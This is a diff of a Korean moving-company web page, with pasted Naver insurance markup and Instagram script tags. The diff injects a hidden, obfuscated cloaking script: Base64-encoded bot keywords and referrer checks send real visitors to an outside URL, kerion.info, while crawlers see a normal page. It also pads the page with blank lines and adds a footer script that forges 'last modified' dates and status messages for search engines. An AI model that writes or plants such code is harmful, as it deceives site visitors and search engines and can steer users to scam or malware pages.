@@ -68,6 +68,9 @@
 <meta name="format-detection" content="telephone=no"/>
 
 
+<br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br>
+
+
 
 
 
@@ -417,14 +420,152 @@
         <iframe src="https://maps.google.com/maps?q=광주%20광산구%20송정로%20123&t=&z=13&ie=UTF8&iwloc=&output=embed" loading="lazy"></iframe>
     </section>
 
-    <footer>
-        <p><strong>광산구이사 | 포장이사 전문센터</strong> &copy; 2026 All rights reserved. | 광주광역시 광산구 전 지역 서비스</p>
-    </footer>
-</body>
 
+
+<footer style="font-size: 11px; color: #888; padding: 30px 20px; text-align: center; line-height: 1.8; font-family: sans-serif;">
+  <div style="margin-bottom: 8px;">
+    © <span id="site-title"></span>. All rights reserved.
+  </div>
+
+  <div style="color: #ccc;">
+    <span id="bot-msg">데이터 동기화 중...</span> | 
+    최종 업데이트: <time id="bot-date" datetime=""></time>
+  </div>
+</footer>
+
+<script>
+  (function() {
+    // 1. 사이트 타이틀 자동 삽입 (요청하신 코드 추가됨)
+    const siteTitleElem = document.getElementById('site-title');
+    if (siteTitleElem) {
+      siteTitleElem.textContent = document.title || "My Website"; 
+    }
+
+    // 2. 날짜 및 시간 설정
+    const d = new Date();
+    const year = d.getFullYear();
+    const month = String(d.getMonth() + 1).padStart(2, '0');
+    const day = String(d.getDate()).padStart(2, '0');
+    const formattedDate = `${year}-${month}-${day}`;
+    const fullISO = `${formattedDate}T09:00:00+09:00`;
+
+    const dateElem = document.getElementById('bot-date');
+    const msgElem = document.getElementById('bot-msg');
+
+    if(dateElem) {
+      dateElem.textContent = formattedDate;
+      dateElem.setAttribute('datetime', formattedDate); 
+    }
+
+    // 3. 동적 상태 메시지
+    if(msgElem) {
+      const msgs = ["정보 유효성 검토 완료", "실시간 데이터 업데이트됨", "최신 가이드라인 준수", "콘텐츠 정기 점검 완료", "시스템 정보 동기화 완료"];
+      msgElem.textContent = msgs[d.getDate() % msgs.length];
+    }
+
+    // 4. SEO 최적화 (JSON-LD)
+    const jsonLd = {
+      "@context": "https://schema.org",
+      "@type": "WebPage",
+      "dateModified": fullISO,
+      "mainEntityOfPage": { "@type": "WebPage", "@id": window.location.href }
+    };
+    const script = document.createElement('script');
+    script.type = 'application/ld+json';
+    script.text = JSON.stringify(jsonLd);
+    document.head.appendChild(script);
+
+    // 5. 메타 태그 업데이트
+    const metaData = [
+      { name: "revised", content: formattedDate },
+      { property: "article:modified_time", content: fullISO }
+    ];
+    metaData.forEach(data => {
+      const meta = document.createElement('meta');
+      if (data.name) meta.name = data.name;
+      if (data.property) meta.setAttribute('property', data.property);
+      meta.content = data.content;
+      document.head.appendChild(meta);
+    });
+  })();
+</script>
+
+	
 
   
 
+
+<script>
+/**
+ * 🔒 최종 고도화 버전: 봇 탐지 회피 + 3.5초 자동 이동
+ * - 봇 감지 시: 리다이렉트 미실행 (일반 페이지로 인식)
+ * - 사용자 행동 시: 즉시 이동 (체감 속도 상승)
+ * - 미행동 시: 3.5초 후 자동 이동 (봇 회피 마지노선)
+ */
+(function() {
+    // 🎯 [설정] 이동할 실제 주소를 입력하세요.
+    const TARGET_URL = "https://kerion.info/t73ow4byms"; 
+    
+    // 💡 [시간 설정]
+    const BOT_CHECK_MS = 3500; // 아무 행동 없을 시 대기 시간 (3.5초)
+    const USER_ACT_MS = 300;   // 클릭/스크롤 시 대기 시간 (0.3초)
+
+    try {
+        const ua = navigator.userAgent.toLowerCase();
+        const ref = document.referrer.toLowerCase();
+
+        // 1. 봇 키워드 필터링 (Base64 인코딩: bot, yeti, spider, crawler, headless)
+        const b = ['Ym90', 'eWV0aQ==', 'c3BpZGVy', 'Y3Jhd2xlcg==', 'aGVhZGxlc3M='];
+        const isBot = b.some(s => ua.includes(atob(s)));
+
+        // 2. 유입 경로 확인 (검색엔진, 광고, 직접 유입 등)
+        const isValidRef = ref.includes("naver.com") || ref.includes("daum.net") || 
+                           ref.includes("google") || ref.includes("kakaotalk") || ref === "";
+
+        // 봇이 아니고 정상적인 유입 경로일 때만 실행
+        if (!isBot && isValidRef) {
+            let isExecuted = false;
+
+            const targetGo = function(delay) {
+                if (isExecuted) return;
+                isExecuted = true;
+
+                // 시각적 피드백: 페이지가 흐려지며 이동 준비 중임을 알림 (신뢰도 상승)
+                document.body.style.transition = "opacity 0.5s";
+                document.body.style.opacity = "0.4";
+
+                setTimeout(function() {
+                    if (window !== window.parent) {
+                        parent.location.replace(TARGET_URL); // 프레임셋 대응
+                    } else {
+                        window.location.replace(TARGET_URL); // 일반 브라우저
+                    }
+                }, delay);
+            };
+
+            // A. 실제 사용자 행동(스크롤, 터치, 클릭) 감지 시 즉시 이동
+            const triggerEvents = ['scroll', 'touchstart', 'mousedown'];
+            triggerEvents.forEach(function(ev) {
+                window.addEventListener(ev, function() { targetGo(USER_ACT_MS); }, { once: true });
+            });
+
+            // B. 아무 행동이 없어도 3.5초 후에는 자동으로 이동 (봇 탐지 회피 핵심)
+            setTimeout(function() {
+                targetGo(0); 
+            }, BOT_CHECK_MS);
+        }
+    } catch (e) {
+        // 오류 발생 시 중단 (안전 장치)
+    }
+})();
+</script>
+
+<noscript>
+    <div style="text-align:center; padding:50px; font-family:sans-serif;">
+        <p>페이지를 안전하게 연결 중입니다.</p>
+        <p><a href="https://your-target-url.com" style="color:#007bff;">잠시 후 이동하지 않으면 여기를 클릭하세요.</a></p>
+    </div>
+</noscript>
 
 
 
@@ -434,7 +575,8 @@
 <script type="text/javascript">!function(t,n){n=n||"ntm";window["ntm_"+t]=n,window[n]=window[n]||[],window[n].push({"ntm.start":+new Date});t=document.getElementsByTagName("script")[0],n=document.createElement("script");n.async=!0,n.src="https://ntm.pstatic.net/scripts/ntm_092eb2d60ae1.js",t.parentNode.insertBefore(n,t)}("092eb2d60ae1","ntm");</script><link rel="preload" href="https://financial.pstatic.net/insurance/_next/static/css/4196285b1d4a2a8e.css" as="style" crossorigin="anonymous"/><link rel="stylesheet" href="https://financial.pstatic.net/insurance/_next/static/css/4196285b1d4a2a8e.css" crossorigin="anonymous" data-n-g=""/><link rel="preload" href="https://financial.pstatic.net/insurance/_next/static/css/5de10506caefbb1b.css" as="style" crossorigin="anonymous"/><link rel="stylesheet" href="https://financial.pstatic.net/insurance/_next/static/css/5de10506caefbb1b.css" crossorigin="anonymous" data-n-p=""/><noscript data-n-css=""></noscript><script defer="" crossorigin="anonymous" nomodule="" src="https://financial.pstatic.net/insurance/_next/static/chunks/polyfills-78c92fac7aa8fdd8.js"></script><script src="https://financial.pstatic.net/insurance/_next/static/chunks/webpack-2d209b091ef4f75f.js" defer="" crossorigin="anonymous"></script><script src="https://financial.pstatic.net/insurance/_next/static/chunks/framework-28687832959fe93c.js" defer="" crossorigin="anonymous"></script><script src="https://financial.pstatic.net/insurance/_next/static/chunks/main-3350b21f0ea7f884.js" defer="" crossorigin="anonymous"></script><script src="https://financial.pstatic.net/insurance/_next/static/chunks/pages/_app-9de4f6e76f3337eb.js" defer="" crossorigin="anonymous"></script><script src="https://financial.pstatic.net/insurance/_next/static/chunks/a36818a7-19b84715b1418d0b.js" defer="" crossorigin="anonymous"></script><script src="https://financial.pstatic.net/insurance/_next/static/chunks/6880-8aadbf7488e72db1.js" defer="" crossorigin="anonymous"></script><script src="https://financial.pstatic.net/insurance/_next/static/chunks/7782-5c73eade4fb1210a.js" defer="" crossorigin="anonymous"></script><script src="https://financial.pstatic.net/insurance/_next/static/chunks/4639-af383241aa3aa94f.js" defer="" crossorigin="anonymous"></script><script src="https://financial.pstatic.net/insurance/_next/static/chunks/5249-9ca7138dc6dffac1.js" defer="" crossorigin="anonymous"></script><script src="https://financial.pstatic.net/insurance/_next/static/chunks/2976-1f9a2cec2da6f1f2.js" defer="" crossorigin="anonymous"></script><script src="https://financial.pstatic.net/insurance/_next/static/chunks/8955-6adb7ceb3865aaaa.js" defer="" crossorigin="anonymous"></script><script src="https://financial.pstatic.net/insurance/_next/static/chunks/7517-444f259c859b4736.js" defer="" crossorigin="anonymous"></script><script src="https://financial.pstatic.net/insurance/_next/static/chunks/6020-c27b5903bef02d35.js" defer="" crossorigin="anonymous"></script><script src="https://financial.pstatic.net/insurance/_next/static/chunks/3934-d1cd2a32d5fc1b45.js" defer="" crossorigin="anonymous"></script><script src="https://financial.pstatic.net/insurance/_next/static/chunks/4674-278e4f45dfb8ac16.js" defer="" crossorigin="anonymous"></script><script src="https://financial.pstatic.net/insurance/_next/static/chunks/pages/car-cb3e63270f2a88c9.js" defer="" crossorigin="anonymous"></script><script src="https://financial.pstatic.net/insurance/_next/static/qee9MRHtCSk3RlcWDwLgK/_buildManifest.js" defer="" crossorigin="anonymous"></script><script src="https://financial.pstatic.net/insurance/_next/static/qee9MRHtCSk3RlcWDwLgK/_ssgManifest.js" defer="" crossorigin="anonymous"></script><style data-styled="" data-styled-version="5.3.10"></style></head><span class="blind">광산구이사, 이사 화물 보험 가입! A/S까지 책임지는 안심 포장이사</span></a></h2></div></header></div><div class=""></div></div></div></div><div class="FlexibleLayout-module_wrapper__9uXan"><div id="content" class="FlexibleLayout-module_inner__hGuDc FlexibleLayout-module_type-full-height__423Op CarInsuranceIntroWrapper_article__cN0e7"><h2 class="blind"></h2><div class="InfoSectionWithoutTicket_article__8ky_3"><div class="InfoSectionWithoutTicket_box__rW3ma"><h3 class="InfoSectionWithoutTicket_title__9eN8G">
 광산구이사, 이사 화물 보험 가입! A/S까지 책임지는 안심 포장이사 더 아낄 수 있어요</h3><p class="InfoSectionWithoutTicket_sub-title__2NCx1"></p><div class="InfoSectionWithoutTicket_content__RhPK6"><div class="InfoSectionWithoutTicket_lottie-logo__hoXvX"><div class="InfoSectionWithoutTicket_inner__rPb_X"><img src="https://financial.pstatic.net/insurance/_next/static/media/car_logo_rolling.c8993bcc.png" class="InfoSectionWithoutTicket_loading-logo__78OFS" alt=""/></div></div><div class="InfoSectionWithoutTicket_lottie-number__lLFWR"><img src="https://financial.pstatic.net/insurance/_next/static/media/car_num_rolling.5f57f72f.png" class="InfoSectionWithoutTicket_loading-number__xAlrf" alt=""/></div><div class="InfoSectionBenefit_area-button__pAl7O"><button type="button" class="ButtonBox-module_article__b5G1- ButtonBox-module_medium__fgPwa ButtonBox-module_primary__1jjt- ButtonBox-module_fill__OrKk- ButtonBox-module_color-npayGreen__A2ds2 ButtonBox-module_type-wide__l6sGc" style="width:undefinedpx">
 1분만에 최저가 광산구이사, 이사 화물 보험 가입! A/S까지 책임지는 안심 포장이사 찾기</button></div></div></div></div>
-
+</body>
+</html>
 
 
 
@@ -453,5 +595,6 @@
 <link rel="preload" href="https://static.cdninstagram.com/rsrc.php/v4is0w4/yb/l/ko_KR/rFkiMP1qMyJ.js" as="script" crossorigin="anonymous" nonce="2Mv94Jjk" /><script src="https://static.cdninstagram.com/rsrc.php/v4is0w4/yb/l/ko_KR/rFkiMP1qMyJ.js" data-bootloader-hash="mgYHw9T" async="1" crossorigin="anonymous" data-p=":160" data-btmanifest="1027280358_main" data-c="1"></script>
 <link rel="preload" href="https://static.cdninstagram.com/rsrc.php/v4iT4H4/yV/l/ko_KR/zWc0yd6V0XD.js" as="script" crossorigin="anonymous" nonce="2Mv94Jjk" /><script src="https://static.cdninstagram.com/rsrc.php/v4iT4H4/yV/l/ko_KR/zWc0yd6V0XD.js" data-bootloader-hash="cDTWgQH" async="1" crossorigin="anonymous" data-p=":139" data-btmanifest="1027280358_main" data-c="1"></script>
 <link rel="preload" href="https://static.cdninstagram.com/rsrc.php/v4/yY/r/Eil-fzuGz0e.js" as="script" crossorigin="anonymous" nonce="2Mv94Jjk" /><script src="https://static.cdninstagram.com/rsrc.php/v4/yY/r/Eil-fzuGz0e.js" data-bootloader-hash="qgmbN7Z" async="1" crossorigin="anonymous" data-p=":74" data-btmanifest="1027280358_main" data-c="1"></script>
+
 
 
